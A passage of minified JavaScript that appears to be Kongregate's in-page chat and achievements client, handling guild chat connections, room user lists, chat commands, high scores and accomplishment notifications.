0===e.ext&&(e.ext={}),e.ext.auth_token=this._authenticator.token(),"/meta/connect"===e.channel&&this.activeRoom&&(e.ext.active_room=this.activeRoom),t(e)}},$j.extend(FayeConnection.prototype,Evented),FayeEventDispatcher=function(e){this.initialize(e)},FayeEventDispatcher.MAX_UUIDS=50,FayeEventDispatcher.prototype={initialize:function(e){this._holodeckEventDispatcher=e.holodeckEventDispatcher,this._uuids=[]},message:function(e,t){this.checkDuplicateMessage(t)||("0"===t.kuid?this._holodeckEventDispatcher.fire({type:KonduitEvent.SYSTEM_MESSAGE,data:{data:t.data,timestamp:1e3*t.timestamp,room:e}}):this._holodeckEventDispatcher.fire({type:KonduitEvent.ROOM_MESSAGE,data:{history:!1,message:t.text,timestamp:1e3*t.timestamp,room:e,user:FayeUserTransformer.transformUser(t)}}))},history:function(e,t){this._holodeckEventDispatcher.fire({type:KonduitEvent.HISTORY_RECEIVED,data:{room:e,count:t}})},checkDuplicateMessage:function(e){for(var t=0;t<this._uuids.length;t++)if(this._uuids[t]==e.uuid)return!0;return this._uuids.push(e.uuid),this._uuids.length>FayeEventDispatcher.MAX_UUIDS&&this._uuids.shift(),!1},disconnect:function(){this._holodeckEventDispatcher.fire({type:KonduitEvent.FAYE_DISCONNECT,data:{}})},connect:function(){this._holodeckEventDispatcher.fire({type:KonduitEvent.FAYE_CONNECT,data:{}})},userJoin:function(e,t){this._holodeckEventDispatcher.fire({type:KonduitEvent.USER_JOIN,data:{room:e,user:FayeUserTransformer.transformUser(t)}})},userDeparture:function(e,t){this._holodeckEventDispatcher.fire({type:KonduitEvent.USER_DEPARTURE,data:{room:e,user:FayeUserTransformer.transformUser(t)}})},userChanged:function(e,t){this._holodeckEventDispatcher.fire({type:KonduitEvent.USER_CHANGED,data:{room:e,force:!0,user:FayeUserTransformer.transformUser(t)}})},messageTooLong:function(){this._holodeckEventDispatcher.fire({type:KonduitEvent.MESSAGE_ERROR,data:{errorType:KonduitChatErrorMessage.MESSAGE_TOO_LONG}})},messageRateLimited:function(){this._holodeckEventDispatcher.fire({type:KonduitEvent.MESSAGE_ERROR,data:{errorType:KonduitChatErrorMessage.RATE_LIMITED}})},joinRoom:function(e){this._holodeckEventDispatcher.fire({type:KonduitEvent.JOIN_ROOM,data:{room:e}})},roomNotFound:function(){this._holodeckEventDispatcher.fire({type:KonduitEvent.ROOM_NOT_FOUND,data:{room:{name:"That guild chat room",type:"guild"}}})},leaveRoom:function(e,t){data={owner_left:!1,kicked:!!t,owner_destroyed:!1,room:e},this._holodeckEventDispatcher.fire({type:KonduitEvent.LEAVE_ROOM,data:data})}},FayeHistoryService=function(e){this.initialize(e)},FayeHistoryService.MAX_MESSAGES=20,FayeHistoryService.prototype={initialize:function(e){this._authenticator=e.authenticator},_makeAjaxRequest:function(e,t,i){return $j.ajax(this._url(e),{method:"GET",dataType:"jsonp",data:{max_time:t,min_time:i}})},fetchHistory:function(e,t,i){var n=this;this._makeAjaxRequest(e,t,i).then((function(t){$j.each(t.history,(function(t,i){n.trigger("message",e,FayeMessageTransformer.transform(i))})),n.trigger("history",e,t.history.length)}))},_url:function(e){return window.FAYE_CONFIG.KWAK_RAILS_URL+"/rooms"+e.id+"/history.jsonp?t="+this._authenticator.token()}},$j.extend(FayeHistoryService.prototype,Evented),FayeRoomList=function(e){this.initialize(e)},FayeRoomList.CHANGED="changed",FayeRoomList.ADDED="added",FayeRoomList.EXISTS="exists",FayeRoomList.REMOVED="removed",FayeRoomList.USERNAME_CHANGED="username_changed",FayeRoomList.prototype={initialize:function(e){this._users={}},addUser:function(e){if(this._users[e.kuid]){if(this._users[e.kuid].username!=e.username){var t={status:FayeRoomList.USERNAME_CHANGED,existingUser:this._users[e.kuid]};return this._users[e.kuid]=e,t}return this._diffUser(e)?(this._users[e.kuid]=e,{status:FayeRoomList.CHANGED}):{status:FayeRoomList.EXISTS}}return this._users[e.kuid]=e,{status:FayeRoomList.ADDED}},addUsers:function(e){var t=this,i={},n=[],s=[],o=[],a=$j.extend({},this._users);return $j.each(e,(function(e,i){switch(delete a[i.kuid],(e=t.addUser(i)).status){case FayeRoomList.ADDED:n.push(i);break;case FayeRoomList.CHANGED:s.push(i);break;case FayeRoomList.USERNAME_CHANGED:n.push(i),o.push(e.existingUser)}})),$j.each(Object.keys(a),(function(e,i){o.push(a[i]),delete t._users[i]})),i[FayeRoomList.ADDED]=n,i[FayeRoomList.CHANGED]=s,i[FayeRoomList.REMOVED]=o,i},_diffUser:function(e){var t=!1,i=this._users[e.kuid];return $j.each(Object.keys(e),(function(n,s){if(e[s]!==i[s])return t=!0,!1})),t}},FayeRoomListService=function(e){this.initialize(e)},FayeRoomListService.MESSAGE_FIELDS="kuid level username character_name user_id admin developer premium mobile".split(" "),FayeRoomListService.prototype={initialize:function(e){this._authenticator=e.authenticator,this._intervalManager=new IntervalManager(this._fetchUserList.bind(this),3e5)},connect:function(e){this._currentRoom&&this._fetchUserList()},subscribe:function(e){this._currentRoom=e,this._roomList=new FayeRoomList,this._intervalManager.start(!1),this._fetchUserList()},unsubscribe:function(e){this._currentRoom&&this._currentRoom.id===e.id&&(this._intervalManager.stop(),this._currentRoom=this._roomList=null)},message:function(e,t){if(!t.history&&"0"!==t.kuid){var i={active:!0};switch($j.each(FayeRoomListService.MESSAGE_FIELDS,(function(e,n){i[n]=t[n]})),(e=this._roomList.addUser(i)).status){case FayeRoomList.ADDED:this.trigger("userJoin",this._currentRoom,i);break;case FayeRoomList.CHANGED:this.trigger("userChanged",this._currentRoom,i);break;case FayeRoomList.USERNAME_CHANGED:this.trigger("userDeparture",this._currentRoom,e.existingUser),this.trigger("userJoin",this._currentRoom,i)}}},_makeAjaxRequest:function(){return $j.ajax(this._url(this._currentRoom),{method:"GET",dataType:"jsonp"})},_fetchUserList:function(){var e=this,t=this._currentRoom.id;this._makeAjaxRequest().then((function(i){e._currentRoom&&e._currentRoom.id==t&&(i=e._roomList.addUsers(i.characters),e._triggerEvents(i[FayeRoomList.ADDED],"userJoin"),e._triggerEvents(i[FayeRoomList.CHANGED],"userChanged"),e._triggerEvents(i[FayeRoomList.REMOVED],"userDeparture"))}))},_triggerEvents:function(e,t){var i=this;$j.each(e,(function(e,n){i.trigger(t,i._currentRoom,n)}))},_url:function(e){return window.FAYE_CONFIG.KWAK_RAILS_URL+"/rooms"+e.id+"/characters.jsonp?t="+this._authenticator.token()}},$j.extend(FayeRoomListService.prototype,Evented),FayeService=function(e){this.initialize(e)},FayeService.prototype={initialize:function(e){this._authenticator=e.authenticator,this._fayeConnection=e.fayeConnection||new FayeConnection({authenticator:this._authenticator}),this._fayeConnection.on("message",this,"trigger","message"),this._fayeConnection.on("disconnect",this,"trigger","disconnect"),this._fayeConnection.on("connect",this,"trigger","connect")},setPresence:function(e,t){this._fayeConnection.setPresence(e,t)},subscribe:function(e){var t=this;this._currentGuildRoom&&this.leaveCurrentGuildRoom(!1),this._fayeConnection.subscribe(e).then((function(e){t._currentGuildRoom=e,t._fayeConnection.setPresence(e.id,!0),t.trigger("joinRoom",e)}),(function(){t.trigger("roomNotFound")}))},leaveCurrentGuildRoom:function(e){this._fayeConnection.disconnect(),this._currentGuildRoom&&(this._fayeConnection.setPresence(this._currentGuildRoom.id,!1),this.trigger("leaveRoom",this._currentGuildRoom,e),this._currentGuildRoom=null)},sendMessage:function(e,t){var i=this,n=!1;return 250<e.length&&(n=!0,e=e.substr(0,249)+"…"),this._fayeConnection.sendMessage(e,t).then((function(){n&&i.trigger("messageTooLong")}),(function(e){e.rateLimited&&i.trigger("messageRateLimited")}))},isCurrentRoomId:function(e){return this._currentGuildRoom&&e===this._currentGuildRoom.id},isCurrentRoomName:function(e){return this._currentGuildRoom&&e===this._currentGuildRoom.xmpp_name}},$j.extend(FayeService.prototype,Evented),FayeUserTransformer=function(){var e=[];return $j.each(["blue","green","purple","red"],(function(t,i){for(t=1;6>=t;t++)e.push("guestavatar-"+i+t+".png")})),{transformUser:function(t){var i=t.username||"_"+t.kuid,n=null;active_user.username()!==t.username&&(n=t.active?"chat":"away");var s=t.level,o=t.character_name,a=t.admin,r=t.developer,c=t.premium,h=t.mobile,d=window.location.host.split(".")[1];if(t.username)t="assets/dynamic/accounts/"+t.username+"/avatar";else{for(var u=0,l=(t=t.kuid).length,_=0;_<l;_++)u=(u<<5)-u+t.charCodeAt(_),u&=u;t="assets/mobile_guest_avatars/"+e[Math.abs(u)%e.length]}return{username:i,variables:{level:s,username:i,game_character_name:o,presence:n,admin:a,curator:!1,developer:r,moderator:!1,premium:c,mobile:h,chat_avatar_url:"https://assets."+d+".com/"+t+"?i10c=img.resize(width:16,height:16)",game_title:null,game_url:null,role:"participant",special_chat_vars:"{}",type:""}}}}}(),GuildChatAuthenticator.prototype={initialize:function(){},authenticate:function(e){return this._guildId=e,this._fetchToken()},reauthenticate:function(){var e=this;return this._fetchToken().then(null,(function(){e.trigger("kick")}))},_fetchToken:function(){var e=this;return $j.getJSON("/api/internal/v1/guilds/"+this._guildId+"/token.json").then((function(t){return e._token=t.token,e._expires=Date.now()+1e3*t.ttl,t}))},token:function(){var e=this;return!this._pendingTokenRequest&&Date.now()>=this._expires-3e5&&(this._pendingTokenRequest=this.reauthenticate().always((function(){e._pendingTokenRequest=null}))),this._token}},$j.extend(GuildChatAuthenticator.prototype,Evented),HighScores=function(e){this.initialize(e)},HighScores.prototype={initialize:function(e){this._active=!1,this._holodeck=e,this._container=$("high_scores_container"),this._high_scores_node=$("high_scores"),this._high_scores_spinner=$("high_scores_spinner")},activate:function(e){this._holodeck.recordAnalyticsEvent("Achievements","Scores"),this.hideAccomplishmentsSection(),this.getHighScores(e)},getHighScores:function(e,t,i){var n=this._container,s=this._holodeck,o=this._high_scores_node;s.chatWindow();var a=this,r="/high_scores.chat?game_id="+s.gameId();this._active=!0,o.hide(),this._high_scores_spinner.show(),e&&(r+="&statistic_id="+e),i&&(r+="&"+i+"="+t,s.recordAnalyticsEvent("Achievements","ScoresChangePage")),this._tabs&&(this._last_tab=this._tabs.activeLink.key),new Ajax.Updater({success:"high_scores"},r,{method:"get",onComplete:function(){a._active&&(a.hideAccomplishmentsSection(),a._high_scores_spinner.hide(),a.hookUpTabsAndSelect(),o.show(),n.ieHappyShow())}})},deactivate:function(){this._active=!1,this._high_scores_spinner&&this._high_scores_spinner.hide(),this._container&&this._container.ieHappyHide(),this.showAccomplishmentsSection()},hideAccomplishmentsSection:function(){this.accomplishmentsTabNode().ieHappyHide()},showAccomplishmentsSection:function(){this.accomplishmentsTabNode().ieHappyShow()},hookUpTabsAndSelect:function(e){var t=this,i=$("statistic_id");e="weekly_high_score_tab_pane",this._last_tab&&(e=this._last_tab),this._tabs=new HolodeckTabs("high_score_tab_set",{defaultTab:e}),$$(".high_score_panel_tab").each((function(e){e.observe("click",(function(e){holodeck.recordMappedEventAnalytic(e.target.up("li").id)}))})),i&&i.observe("change",(function(){t._holodeck.recordAnalyticsEvent("Achievements","ScoresChangeStat");var e=i.getValue();t.getHighScores(e)}))},accomplishmentsTabNode:function(){return this._accomplishments_tab_content_node||(this._accomplishments_tab_content_node=$("accomplishments_tab_content")),this._accomplishments_tab_content_node}},Holodeck=function(e){this.initialize(e)},Holodeck.KONG_GAMEPLAYS_COOKIE_NAME="kong_gameplays",Holodeck.KONG_HS_ALERT_COOKIE_NAME="kong_hs_alert",Holodeck.KONG_HS_ALERT_TIME_COOKIE_NAME="kong_hs_alert_time",Holodeck.HOLODECK_TAB_COOKIE_NAME="holodeck_tab",Holodeck.SIGNUP_TAB_NAME="signup_tab_pane",Holodeck.SIGNIN_TAB_NAME="signin_tab_pane",Holodeck.CHAT_TAB_NAME="chat_tab_pane",Holodeck.LAST_PRIVATE_ROOM_KEY="last_private_room",Holodeck.LAST_GAME_ROOM_COOKIE_PREFIX="last_game_room_",Holodeck.LAST_GUILD_ROOM_FOR_CURRENT_GAME_COOKIE_PREFIX="last_kgr_",Holodeck.LAST_SITEWIDE_GUILD_ROOM_COOKIE="last_kgr",Holodeck.GAME_ROOM_JOIN={type:"game"},Holodeck.GOOGLE_A_DAY_START_DATE=new Date("Aug 16 2012"),Holodeck.GOOGLE_A_DAY_END_DATE=new Date("Sep 30 2012"),Holodeck.HS_ALERT_WAIT_MILLISECONDS=36e5,Holodeck.guildIdFromXmppName=function(e){if(e=/guilds\/(\d+)/.exec(e))return e[1]},Holodeck.prototype={initialize:function(e){var t=window.location.search.parseQuery().guest_access_key,i={};t&&(i.guest_access_key=t),this.ready=!1,this._konduit=new Konduit,this._game_discussions=new GameDiscussions({gameUrl:active_user.gameResourcePath(),inGuilds:page_data.in_guilds,hasGameSpecificForum:e.has_game_specific_forum}),new Ajax.Updater({success:"chat_container"},e.holodeck_url,{method:"get",parameters:i,evalScripts:!0,onComplete:function(){holodeck.uiLoaded(e)},onException:function(e,t){console.error(t.message)}})},uiLoaded:function(e){if(window.onunload||(window.onunload=Prototype.emptyFunction),e){e.holodeck=this;var t=document.location.href.parseQuery();this._interval_between_renders=parseInt(t.interval_between_renders,10)||20,this._has_shown_cannot_connect_alert=!1,this._event_dispatcher=new KonduitEventDispatcher,this.initializeAccomplishmentTracker(e),this._html_dimensions=e.html_dimensions,this._chat_window=new ChatWindow(e),this._sticker_manager=new StickerManager(e),this._sticker_manager.trackActiveSession(),this._users_invited={},this._ignored_invitations={},this._holodeck_event_analytics=new HolodeckEventAnalytics,this._incoming_message_filters=[],this._outgoing_message_filters=[],this._game_id=e.game_id,(this._active_user=e.active_user)&&this._active_user.setHolodeck(this),this._chat_disconnected_indicator_node=$("chat_disconnected_indicator"),this._chat_connected_indicator_node=$("chat_connected_indicator"),this._chat_limited_connection_indicator_node=$("chat_limited_connection_indicator"),this._accomplishment_group_award_tab_node=$("accomplishment_group_awarded_tab_pane_content"),this._just_earned_badge=this._suppress_disconnect=this._has_logged_in=!1,this._accomplishments_bootstrap_url=e.accomplishments_bootstrap_url,this._sticker_drop_url=e.sticker_drop_url,this._on_loaded_accomplishments_callbacks=[],this._game_path=e.game_path,this._shared_content_type_permalinks=e.shared_content_type_permalinks,this._shared_content_type_names=e.shared_content_type_names,this._permissions=e.permissions,this._authenticated_only_shared_content_sorts=e.authenticated_only_shared_content_sorts,this._has_game_specific_forum=e.has_game_specific_forum,this._multiplayer_game=e.multiplayer_game,this._suppress_setting_preference_cookie=!1,this._in_beta=e.in_beta,this._in_preview=e.in_preview,this._active_dialogue=void 0,this._chat_commands={},this._chat_api_tab=new ChatApiTab(e),this._chat_host=e.chat_host,this._chat_proxy_websocket=e.chat_proxy_websocket,this._chat_proxy_bosh=e.chat_proxy_bosh,this._saved_shared_content_event=null,this._login_url=e.login_url,this._custom_game_avatar=null,this._avatar_crop_boundaries={},this._avatar_cropper=null,this._extra_interpolation=e.extra_interpolation,this._gameplay_id=null,this._coupon_templates={},this.addChatCommand("w",this.sendWhisper),this.addChatCommand("msg",this.sendWhisper),this.addChatCommand("bug",(function(e,t){t=(t.match(/^\/\S+\s+(.+)$/)||[])[1];var i=e.activeDialogue();return t?e.submitGameBug(t,{onSuccess:function(e){i.insert('<p class="bug">Your bug report has been successfully submitted. Thank you!</p>')},onFailure:function(e){i.insert('<p class="bug">Uh oh! Your bug report could not be completed at this time. Please visit the <a href="/feedbacks/new">feedback form</a> and try again.</p>')}}):i.insert('<p>Use the <code>/bug</code> command to submit a bug report for the game you are playing. Just type <code>/bug</code> followed by a brief report, or visit the <a href="/feedbacks/new">feedback form</a> to submit a more detailed bug report.</p>'),!1})),this.addChatCommand("afk",this.setPresenceAway.bind(this)),this.addChatCommand("back",this.setPresenceChat.bind(this)),this.addChatCommand("invite",(function(e,t){return(t=(t.match(/^\/([^\s]+)\s+([^\s]+)/)||[])[2])&&0<t.length&&e.sendPrivateRoomInvitation(t),!1})),this.addChatCommand("kick",(function(e,t){return(t=(t.match(/^\/([^\s]+)\s+([^\s]+)/)||[])[2])&&0<t.length&&e.privateRoomKick(t),!1})),this.addChatCommand("history",(function(){return holodeck.chatWindow().activeRoom()&&holodeck.chatWindow().activeRoom().fetchHistory(),!1})),this.addMessageFilters();var i=this._event_dispatcher,n=this._chat_window,s=this._accomplishment_tracker,o=e.achievements&&0<e.achievements.length;i.register(KonduitEvent.INIT,(function(e){holodeck.updateDefaultChatTabMessage("Connecting to chat")})),i.register(KonduitEvent.DISCONNECT,(function(e){holodeck.showDisconnectedIndicator(),CinematicMode.addCinematicMessage("You have been disconnected from Kongregate and scores will not be submitted."),e.data.banned?window.location.href="/":e.data.conflict?holodeck.showSessionAlert():e.data.login_failed?holodeck.showSessionExpiredAlert():holodeck._suppress_disconnect?holodeck._suppress_disconnect=!1:holodeck.showDisconnectedAlert()})),i.register(KonduitEvent.FAYE_DISCONNECT,(function(e){n.fayeDisconnect()})),i.register(KonduitEvent.FAYE_CONNECT,(function(e){n.fayeConnect()})),i.register(KonduitEvent.API_INITIALIZED,(function(e){(function(){holodeck.loadSharedContentFromUrl(),holodeck.saveSharedContentFromUrl(),holodeck.konduit().dispatchEvent({type:KonduitEvent.ADD_STATISTICS,data:holodeck._statistics})}).defer()})),i.register(KonduitEvent.STATISTIC_UPDATED,(function(e){holodeck._has_submitted_stats=!0,s.onStatisticUpdated(e)})),i.register(KonduitEvent.STATISTICS_FLUSH,(function(e){holodeck.konduit().dispatchEvent(e)})),i.register(KonduitEvent.KONDUIT_MESSAGE,(function(e){e.data&&e.data.outgoing?i.fire({type:e.data.opcode,data:e.data.params}):holodeck.konduit().dispatchEvent(e)})),i.register(KonduitEvent.LOGIN,(function(e){!0===e.data.success?(holodeck.updateDefaultChatTabMessage("Joining room"),holodeck.setUsername(e.data.username),holodeck._has_logged_in=!0,!0===e.data.bosh?holodeck.showLimitedConnectionIndicator():holodeck.showConnectedIndicator(),n.onLogin(),holodeck.closeAlertTab()):holodeck.updateDefaultChatTabMessage("Chat signin failed!")})),i.register(KonduitEvent.CONNECT,(function(e){!1===e.data.success?!1===holodeck._has_logged_in&&(holodeck.updateDefaultChatTabMessage("Chat connection failed!"),holodeck.showCannotConnectAlert()):holodeck.updateDefaultChatTabMessage("Signing in")})),i.register(KonduitEvent.SILENCED,(function(e){n.onSilenced(e)})),i.register(KonduitEvent.PARTICIPATE,(function(e){n.onParticipate(e)})),i.register(KonduitEvent.JOIN_ROOM,(function(e){switch(e.data.room.type){case"game":holodeck.setGameRoomCookie(e.data.room);break;case"guild":var t=Holodeck.guildIdFromXmppName(e.data.room.xmpp_name);e.data.room.guildId=t,t={type:e.data.room.type,guild_id:t},holodeck.setGuildRoomForCurrentGameCookie(t),holodeck.setSitewideGuildRoomCookie(t);break;case"private":$.jStorage.set(Holodeck.LAST_PRIVATE_ROOM_KEY,e.data.room)}holodeck.displayRoom(e.data.room)})),i.register(KonduitEvent.ROOM_NOT_FOUND,(function(e){"game"==e.data.room.type&&holodeck.getGameRoomCookie()?(holodeck.setGameRoomCookie(),holodeck.joinRoom({type:"game"})):(n.roomNotFound(e.data.room),e.data.room.lockedRetries&&holodeck.updateDefaultChatTabMessage("No Chat Rooms found!"))})),i.register(KonduitEvent.JOIN_GUILD_ROOM,(function(e){n.roomNotFound({type:"guild",name:"Guild Room"})})),i.register(KonduitEvent.ROOM_FULL,(function(e){n.roomFull(e.data.room)})),i.register(KonduitEvent.REQUEST_CHAT_ROOM,(function(e){n.requestRoomToJoin()})),i.register(KonduitEvent.LEAVE_ROOM,(function(e){n.leftRoom(e.data),"guild"===e.data.room.type&&(holodeck.setGuildRoomForCurrentGameCookie(),holodeck.setSitewideGuildRoomCookie())})),i.register(KonduitEvent.ROOM_MESSAGE,(function(e){n.receivedRoomMessage(e)})),i.register(KonduitEvent.SYSTEM_MESSAGE,(function(e){n.receivedSystemMessage(e)})),i.register(KonduitEvent.MESSAGE_ERROR,(function(e){if(n.messageError(e),KonduitChatErrorMessage.RATE_LIMITED===e.data.errorType){var t=n.activeRoom();t=t?t.getId():null;var i=(Cookie.get("rate_limit_log")||"[]").evalJSON();i.push([(new Date).getTime(),t,e.data.ruleViolated]),Cookie.set("rate_limit_log",Object.toJSON(i),void 0,"/")}})),i.register(KonduitEvent.PRIVATE_MESSAGE,(function(e){holodeck.receivedPrivateMessage(e)})),i.register(KonduitEvent.ADMIN_MESSAGE,(function(e){n.receivedAdminMessage(e)})),i.register(KonduitEvent.USER_JOIN,(function(e){holodeck.displayRoomOnFirstJoin(e.data.room),n.userJoinedRoom(e)})),i.register(KonduitEvent.USER_CHANGED,(function(e){n.userChangedInRoom(e)})),i.register(KonduitEvent.USER_DEPARTURE,(function(e){n.userLeftRoom(e)})),i.register(KonduitEvent.GUEST_COUNT,(function(e){n.updateGuestCount(e)})),i.register(KonduitEvent.DISPLAY_SHOUT_BOX,(function(e){a.capturedSelectorWrapper(e,(function(e){holodeck.displayShoutBox(e)}))})),i.register(KonduitEvent.DISPLAY_INVITATION_BOX,(function(e){a.capturedSelectorWrapper(e,(function(e){holodeck.displayInvitationBox(e)}))})),i.register(KonduitEvent.SEND_PRIVATE_MESSAGE,(function(e){a.capturedSelectorWrapper(e,(function(e){holodeck.sendPrivateMessage(e)}))})),i.register(KonduitEvent.DISPLAY_FEED_POST_BOX,(function(e){a.capturedSelectorWrapper(e,(function(e){holodeck.displayFeedPostBox(e)}))})),i.register(KonduitEvent.HANDLE_ITEM_CHECKOUT_REQUEST,(function(e){holodeck.recordAnalyticsEvent("Lightbox","Kred");var t=e.data.url;setTimeout((function(){a.isAuthenticated()?top.lightbox.prototype.initializeKredItemPurchaseFrame(t):(a.activateInlineLogin({},!0),lightbox.prototype.addOnCloseCallback((function(){if(a.isAuthenticated())top.lightbox.prototype.initializeKredItemPurchaseFrame(t);else try{holodeck.konduit().dispatchEvent({type:"purchase_result",data:{success:!1}})}catch(e){}})))}),0)})),i.register(KonduitEvent.DISPLAY_REGISTRATION_LIGHTBOX,(function(e){setTimeout((function(){lightbox.prototype.initializeKongregateLightboxFromAjax("/accounts/new/behind_login?game_id="+a.gameId(),{afterStaticContentLoad:lightbox.prototype.toggleRegistration})}),0)})),i.register(KonduitEvent.DISPLAY_SIGN_IN_LIGHTBOX,(function(e){setTimeout((function(){a.activateInlineLogin()}),0)})),i.register(KonduitEvent.RESIZE_GAME,(function(e){var t=e.data["chat.resizeGame.width"],i=e.data["chat.resizeGame.height"];setTimeout((function(){holodeck.resizeGame(t,i)}),0)})),i.register(KonduitEvent.NEW_HIGH_SCORE,(function(e){holodeck.showHighScoreAlert(e)})),i.register(KonduitEvent.CUSTOM_TAB_SHOW,(function(e){holodeck._chat_api_tab.setTabInfo(e),holodeck.showChatApiTab()})),i.register(KonduitEvent.CUSTOM_TAB_CLOSE,(function(e){holodeck.closeChatApiTab()})),i.register(KonduitEvent.CUSTOM_TAB_MESSAGE,(function(e){holodeck._chat_api_tab.receivedMessage(e)})),i.register(KonduitEvent.CUSTOM_TAB_CLEAR_MESSAGES,(function(e){holodeck._chat_api_tab.clearMessages(e)})),i.register(KonduitEvent.PROCESSING_SAVE_SHARED_CONTENT,(function(e){holodeck.promptProcessingSaveSharedContent(e)})),i.register(KonduitEvent.SAVE_SHARED_CONTENT,(function(e){e.data.filename&&holodeck.promptSaveSharedContent(e.data)})),i.register(KonduitEvent.IMAGE_AVATAR_SUBMIT,(function(e){holodeck.showAvatarTab(e.data.filename)})),i.register(KonduitEvent.BROWSE_SHARED_CONTENT,(function(e){holodeck.showSharedContentsIndex(e.data.content_type,e.data.sort_order,e.data.label)})),i.register(KonduitEvent.PRIVATE_ROOM_INVITATION,(function(e){holodeck.receivedPrivateRoomInvitation(e.data)})),i.register(KonduitEvent.PRIVATE_ROOM_INVITATION_SENT,(function(e){n.onPrivateRoomInvitationSent(e.data)})),i.register(KonduitEvent.HOLODECK_DATA,(function(e){holodeck.handleHolodeckPacket(e.data)})),i.register(KonduitEvent.HISTORY_RECEIVED,(function(e){var t=holodeck.chatWindow().roomByType("guild");t&&(e.data.count<FayeHistoryService.MAX_MESSAGES?t.hideHistoryButton():t.showHistoryButton())})),this._accomplishments=(e.achievements||[]).concat(e.challenges||[]),this._has_submitted_stats=this._authenticated_and_loaded_accomplishments=!1,this._statistics=e.statistics||[],this.setStatisticsAndAccomplishments(this._statistics,this._accomplishments),this.initializeJavascriptApi()}var a=holodeck._active_user;a.occasionallyShowRegistrationLightbox.bind(a).runWhenReady(),holodeck._tabs=new HolodeckTabs("main_tab_set",{afterChange:function(){if(holodeck._tabs){var e=holodeck._tabs.activeContainer;holodeck.checkChatScroll(),holodeck.updateTabCookie(e),"chat_tab_pane"===e.id?holodeck.chatWindow().restoreDefaultView():"accomplishments_tab_pane"===e.id&&o&&holodeck.hideHighScores()}},beforeChange:function(e,t){if(!holodeck._tabs)return!1;if(e=t.id,0===t.children.length){var i=new Template($(e+"_template").innerHTML);t.insert(i.evaluate()),document.fire(e+":loaded")}},defaultTab:void 0,holodeck:holodeck});var r=holodeck._chat_window;holodeck.addOnTabSelectCallback("chat_tab_pane",(function(){r._seen||(r._seen=!0,r.joinRequestedRooms())})),holodeck.addOnTabSelectCallback("more_games_tab_pane",(function(){holodeck._seen_more_games_tab||holodeck.loadMoreGamesTab(),holodeck._seen_more_games_tab=!0})),holodeck._tabs.addOnCloseCallback("avatar_tab_pane",(function(){holodeck.cancelAvatar()})),holodeck.authenticated()?$j("#shared_links_tab").show():a.addRunWhenAuthenticatedObserver((function(){$j("#shared_links_tab").show()})),holodeck.authenticated()?(t=holodeck.getTabFromCookie(),holodeck._tab_from_cookie=t.gsub("_pane",""),holodeck._tabs.show(t)):page_data.autofill_username?($$("#new_session_form input[name='username']").first().value=page_data.autofill_username,holodeck._tabs.show(Holodeck.SIGNIN_TAB_NAME)):holodeck._tabs.show(Holodeck.SIGNUP_TAB_NAME),holodeck.addOnTabLoadCallback("accomplishments_tab_pane",(function(){$("accomplishment_vtab_set")?(holodeck.buildAccomplishmentVtabSet(),holodeck.authenticated()||$$(".accomplishment_signin").each(Element.show)):holodeck.loadHighScores();var e=$("accomplishment_awarded_tab");e&&e.down(".close_tab_link").observe("click",(function(e){holodeck.recordAnalyticsEvent("Award","Close")}))})),this._active_user.addRunWhenAuthenticatedObserver((function(){a.hideRateThisGameTab()||new UserActionCounter({username:a.username(),counterName:"rate_this_game_closure_user_action_counter"}).count((function(e){setTimeout(holodeck._in_beta||holodeck._in_preview?function(){holodeck.showMoreGamesTab()}:function(){holodeck.loadRateThisGameTab(e.count)},12e5)}))})),holodeck._shared_content_welcome_tab=new SharedContentWelcomeTab(e),holodeck._lightbox=lightbox.prototype,document.fire("chat_tabs:ready"),e=parseInt(Cookie.get(Holodeck.KONG_GAMEPLAYS_COOKIE_NAME)||0,10),Cookie.set(Holodeck.KONG_GAMEPLAYS_COOKIE_NAME,e+1,1e4,"/"),this._konduit.setup({eventDispatcher:this._event_dispatcher,chatHost:this._chat_host,chatProxyWebsocket:this._chat_proxy_websocket,chatProxyBosh:this._chat_proxy_bosh}),this.ready=!0,document.fire("holodeck:ready"),holodeck.setUsername(a.username())},initializeAccomplishmentTracker:function(e){this._accomplishment_tracker=new AccomplishmentTracker(Object.clone(e)),this._accomplishment_notifications_node=$$(".accomplishment_notifications")[0],this._accomplishment_tracker.on("task-progress",(function(e){var t=e.percentValue(),i=e.displayValue();e.isComplete(),$$(".accomplishmenttasks-"+e.id()).each((function(n){if(e.isComplete()){n.addClassName("complete");var s=n.down(".accomplishment_task_progress");s&&s.remove()}else(s=n.down(".progress_amount"))&&s.update(i);50<t&&(s=n.down(".marker"))&&s.addClassName("right"),(s=n.down(".current"))&&s.update(i),(n=n.down(".bar"))&&n.setStyle({width:t+"%"})}))})),this._accomplishment_tracker.on("task-complete",(function(e){(e=holodeck.accomplishmentTaskCompletionTemplate(e.id()))&&holodeck.showAccomplishmentCompletedTab(e.cloneNode(!0))})),this._accomplishment_tracker.on("accomplishment-complete",(function(e){holodeck.recordGuestCompletion(e);var t=holodeck._tabs.activeContainer;holodeck.showAccomplishmentsTab(),holodeck.setTab(t.id),e.hasCompletionTabBeenShown()||(holodeck.showAccomplishmentCompletionTab(e.id()),t=holodeck.accomplishmentCompletionTemplate(e.id()),t=e.isBadgeOfTheDay()?$("botd_award_title"):t.down(".reward_tasks h4"),CinematicMode.addCinematicMessage(t.innerHTML)),holodeck.authenticated()&&e.hasCompleteAccomplishmentGroup()&&(holodeck.showAccomplishmentGroupCompletionTab(e.accomplishmentGroup().id()),t="Congratulations! You completed the '"+e.accomplishmentGroup().name()+"' quest.",CinematicMode.addCinematicMessage(t)),holodeck.updateAccomplishmentTab(e.id())}))},initializeJavascriptApi:function(){this._api_service=new ApiService({event_dispatcher:this._event_dispatcher,statistics:this._accomplishment_tracker.statistics(),is_connected:function(){return holodeck.konduit().jabberConnected()}})},requestAnalyticsInfo:function(){this._event_dispatcher.fire({type:KonduitEvent.ANALYTICS_PAYLOAD,data:{}})},displayRoomOnFirstJoin:function(e){this._chat_window.roomByType(e.type)||this.displayRoom(e)},handleHolodeckPacket:function(e){switch(e.holodeck_type){case"levelup":holodeck.showLevelUpTab(e);break;case"coupon_awarded":holodeck.showCouponAwardsTab(e);break;default:console.log("I do not understand this packet type captain.")}},showLevelUpTab:function(e){var t=new Template($("levelup_content_template").innerHTML);holodeck.showProgressTab(t.evaluate($H(e).merge({username:active_user.username()}))),75==e.level&&($("hololevel_next_level_message").hide(),$("hololevel_max_level_message").show())},addCouponTemplate:function(e,t){this._coupon_templates[e]=new Template(t)},showCouponAwardsTab:function(e){var t=e.coupon_promotion_id;if(void 0!==this._coupon_templates[t]){var 